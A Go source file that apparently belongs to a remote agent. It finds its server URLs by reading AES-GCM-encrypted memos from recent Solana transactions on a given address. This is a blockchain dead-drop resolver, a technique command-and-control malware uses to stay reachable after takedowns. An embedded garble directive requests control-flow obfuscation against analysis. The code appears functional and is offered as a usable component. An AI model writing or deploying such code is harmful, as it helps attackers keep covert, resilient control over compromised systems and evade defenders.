package config

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

const solanaMemoProgramID = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"
const solanaRPCMinInterval = time.Second
const solanaRPCMaxResponseBytes = 2 << 20

type rpcPacer struct{ lastRequest time.Time }

func (p *rpcPacer) wait() {
	if delay := solanaRPCMinInterval - time.Since(p.lastRequest); delay > 0 {
		time.Sleep(delay)
	}
	p.lastRequest = time.Now()
}

type rpcRequest struct {
	Jsonrpc string        `json:"jsonrpc"`
	ID      int           `json:"id"`
	Method  string        `json:"method"`
	Params  []interface{} `json:"params"`
}

type signatureInfo struct {
	Signature string      `json:"signature"`
	Err       interface{} `json:"err"`
}

type signaturesResponse struct {
	Result []signatureInfo `json:"result"`
	Error  *rpcError       `json:"error"`
}

type rpcError struct {
	Code    json.Number `json:"code"`
	Message string      `json:"message"`
}

type transactionResponse struct {
	Result *transactionResult `json:"result"`
	Error  *rpcError          `json:"error"`
}

type transactionResult struct {
	Transaction parsedTransaction `json:"transaction"`
}

type parsedTransaction struct {
	Message parsedMessage `json:"message"`
}

type parsedMessage struct {
	Instructions []parsedInstruction `json:"instructions"`
}

type parsedInstruction struct {
	ProgramId string      `json:"programId"`
	Parsed    interface{} `json:"parsed"`
	Program   string      `json:"program"`
}

func LoadServerURLsFromSolana(solAddress, agentToken string, rpcEndpoints []string) ([]string, error) {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	if solAddress == "" {
		return nil, fmt.Errorf("solana address is empty")
	}
	if agentToken == "" {
		return nil, fmt.Errorf("agent token required for solana memo decryption")
	}
	if len(rpcEndpoints) == 0 {
		return nil, fmt.Errorf("no solana RPC endpoints configured")
	}

	client := &http.Client{Timeout: 15 * time.Second}
	endpoints := append([]string(nil), rpcEndpoints...)
	rand.Shuffle(len(endpoints), func(i, j int) { endpoints[i], endpoints[j] = endpoints[j], endpoints[i] })
	pacer := &rpcPacer{}

	keyHash := sha256.Sum256([]byte(agentToken))
	log.Printf("[solana] using key hash prefix: %x (token len=%d)", keyHash[:4], len(agentToken))

	var signatures []signatureInfo
	var lastErr error
	var rpcSucceeded bool
	for _, endpoint := range endpoints {
		sigs, err := getSignatures(client, pacer, endpoint, solAddress)
		if err != nil {
			lastErr = err
			log.Printf("[solana] RPC %s failed for getSignatures: %v", endpoint, err)
			continue
		}
		rpcSucceeded = true
		if len(sigs) == 0 {
			continue
		}
		signatures = sigs
		break
	}
	if signatures == nil {
		if rpcSucceeded {
			return nil, fmt.Errorf("no transactions found for address %s", solAddress)
		}
		return nil, fmt.Errorf("all RPC endpoints failed for getSignatures: %v", lastErr)
	}

	if len(signatures) == 0 {
		return nil, fmt.Errorf("no transactions found for address %s", solAddress)
	}

	for _, sig := range signatures {
		if sig.Err != nil {
			continue
		}

		for _, endpoint := range endpoints {
			memo, err := getMemoFromTransaction(client, pacer, endpoint, sig.Signature)
			if err != nil {
				log.Printf("[solana] RPC %s failed for tx %s: %v", endpoint, shortSignature(sig.Signature), err)
				continue
			}
			if memo == "" {
				break
			}

			decrypted, err := decryptMemo(memo, agentToken)
			if err != nil {
				log.Printf("[solana] failed to decrypt memo from tx %s: %v", shortSignature(sig.Signature), err)
				break
			}

			urls := parseMemoURLs(decrypted)
			if len(urls) > 0 {
				log.Printf("[solana] resolved %d server URL(s) from memo in tx %s", len(urls), shortSignature(sig.Signature))
				return urls, nil
			}
			break
		}
	}

	return nil, fmt.Errorf("no valid decryptable memo found in recent transactions")
}

func shortSignature(signature string) string {
	if len(signature) <= 16 {
		return signature
	}
	return signature[:16]
}

func getSignatures(client *http.Client, pacer *rpcPacer, endpoint, address string) ([]signatureInfo, error) {
	reqBody := rpcRequest{
		Jsonrpc: "2.0",
		ID:      1,
		Method:  "getSignaturesForAddress",
		Params: []interface{}{
			address,
			map[string]interface{}{"limit": 5},
		},
	}

	data, err := json.Marshal(reqBody)
	if err != nil {
		return nil, err
	}

	pacer.wait()
	resp, err := client.Post(endpoint, "application/json", strings.NewReader(string(data)))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if err := validateRPCResponse(resp); err != nil {
		return nil, err
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, solanaRPCMaxResponseBytes))
	if err != nil {
		return nil, err
	}

	var result signaturesResponse
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("failed to parse signatures response: %v", err)
	}

	if result.Error != nil {
		return nil, fmt.Errorf("RPC error %s: %s", result.Error.Code.String(), result.Error.Message)
	}

	return result.Result, nil
}

func getMemoFromTransaction(client *http.Client, pacer *rpcPacer, endpoint, signature string) (string, error) {
	reqBody := rpcRequest{
		Jsonrpc: "2.0",
		ID:      1,
		Method:  "getTransaction",
		Params: []interface{}{
			signature,
			map[string]interface{}{
				"encoding":                       "jsonParsed",
				"maxSupportedTransactionVersion": 0,
			},
		},
	}

	data, err := json.Marshal(reqBody)
	if err != nil {
		return "", err
	}

	pacer.wait()
	resp, err := client.Post(endpoint, "application/json", strings.NewReader(string(data)))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if err := validateRPCResponse(resp); err != nil {
		return "", err
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, solanaRPCMaxResponseBytes))
	if err != nil {
		return "", err
	}

	var result transactionResponse
	if err := json.Unmarshal(body, &result); err != nil {
		return "", fmt.Errorf("failed to parse transaction response: %v", err)
	}

	if result.Error != nil {
		return "", fmt.Errorf("RPC error %s: %s", result.Error.Code.String(), result.Error.Message)
	}

	if result.Result == nil {
		return "", fmt.Errorf("transaction not found")
	}

	for _, inst := range result.Result.Transaction.Message.Instructions {
		if inst.ProgramId == solanaMemoProgramID {
			if s, ok := inst.Parsed.(string); ok && s != "" {
				return s, nil
			}
		}
	}

	return "", nil
}

func validateRPCResponse(resp *http.Response) error {
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		return nil
	}
	if resp.StatusCode == http.StatusTooManyRequests {
		retryAfter := strings.TrimSpace(resp.Header.Get("Retry-After"))
		if seconds, err := strconv.Atoi(retryAfter); err == nil && seconds > 0 {
			return fmt.Errorf("RPC rate limited (retry after %ds)", seconds)
		}
		return fmt.Errorf("RPC rate limited")
	}
	return fmt.Errorf("RPC returned HTTP %s", resp.Status)
}

func decryptMemo(memoBase64, agentToken string) (string, error) {
	raw, err := base64.StdEncoding.DecodeString(memoBase64)
	if err != nil {
		raw, err = base64.URLEncoding.DecodeString(memoBase64)
		if err != nil {
			return "", fmt.Errorf("invalid base64 memo: %v", err)
		}
	}

	if len(raw) < 12+16+1 {
		return "", fmt.Errorf("memo too short to be valid ciphertext")
	}

	nonce := raw[:12]
	ciphertext := raw[12:]

	keyHash := sha256.Sum256([]byte(agentToken))
	block, err := aes.NewCipher(keyHash[:])
	if err != nil {
		return "", fmt.Errorf("failed to create AES cipher: %v", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %v", err)
	}

	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", fmt.Errorf("decryption failed: %v", err)
	}

	return string(plaintext), nil
}

func parseMemoURLs(decrypted string) []string {
	var urls []string
	seen := map[string]struct{}{}
	for _, line := range strings.Split(decrypted, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		normalized, err := normalizeServerURL(line)
		if err != nil {
			log.Printf("[solana] invalid URL in memo: %q: %v", line, err)
			continue
		}
		if normalized == "" {
			continue
		}
		if _, ok := seen[normalized]; ok {
			continue
		}
		seen[normalized] = struct{}{}
		urls = append(urls, normalized)
	}
	return urls
}
